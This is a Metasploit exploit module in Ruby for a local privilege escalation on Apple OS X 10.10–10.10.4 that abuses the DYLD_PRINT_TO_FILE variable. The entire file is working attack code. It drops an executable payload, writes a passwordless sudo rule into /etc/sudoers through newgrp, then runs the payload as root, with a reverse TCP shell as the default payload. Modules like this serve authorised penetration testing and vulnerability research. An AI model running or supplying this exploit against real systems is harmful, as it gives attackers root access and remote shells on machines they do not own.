# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Local

  Rank = GreatRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apple OS X DYLD_PRINT_TO_FILE Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        In Apple OS X 10.10.4 and prior, the DYLD_PRINT_TO_FILE environment
        variable is used for redirecting logging data to a file instead of
        stderr. Due to a design error, this feature can be abused by a local
        attacker to write arbitrary files as root via restricted, SUID-root
        binaries.
      },
      &#039;Author&#039;         => [
        &#039;Stefan Esser&#039;, # Vulnerability discovery and PoC
        &#039;joev&#039;          # Copy/paste monkey
      ],
      &#039;References&#039;     => [
        [&#039;URL&#039;, &#039;https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html&#039;],
        [&#039;URL&#039;, &#039;https://www.reddit.com/r/netsec/comments/3e34i2/os_x_1010_dyld_print_to_file_local_privilege/&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Jul 21 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;osx&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Mac OS X 10.10-10.10.4&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039;         => &#039;osx/x64/shell_reverse_tcp&#039;
      }
    ))

    register_options([
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/.Trashes&#039;])
    ])
  end

  def exploit
    print_status("Writing payload to `#{payload_file}&#039;")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)
    cmd_exec("chmod +x #{payload_file}")

    print_status("Executing exploit at `#{payload_file}&#039;...")
    cmd_exec(sploit)
  end

  def check
    (ver?) ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def ver?
    Gem::Version.new(get_sysinfo[&#039;ProductVersion&#039;]).between?(
      Gem::Version.new(&#039;10.10.0&#039;), Gem::Version.new(&#039;10.10.4&#039;)
    )
  end

  def sploit
    %Q{/bin/sh -c "echo &#039;echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3&#039; | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo #{payload_file} &"}
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def payload_file
    @payload_file ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

end

